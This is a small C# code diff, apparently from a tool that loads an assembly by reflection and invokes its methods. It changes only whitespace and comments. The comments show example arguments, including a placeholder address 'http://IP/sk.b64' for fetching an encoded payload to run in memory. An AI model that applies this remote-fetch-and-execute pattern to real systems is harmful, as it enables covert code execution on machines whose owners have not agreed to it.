@@ -37,13 +37,13 @@
 			 
 			 //Below Two lines get commented if args needed
 			 object o = a.CreateInstance(method.Name);
-             method.Invoke(o, null);
+                         method.Invoke(o, null);
 			 
-			 //If Args are required uncomment below two lines and comment above line
+			 //If Args are required uncomment below two lines and comment the two above lines
 			 //string[] args1 = new string[] { "BasicOSInfo" };
                          //a.EntryPoint.Invoke(null, new object[] { args1 });
 
-                         //If multiple Args are needed
+                         //If multiple Args are needed, comment the above lines and uncomment the below lines, adding as many args as needed
 			 //string args1 = "-net";
 			 //string args2 = "http://IP/sk.b64";
 			 //string args3 = "\"test\"";
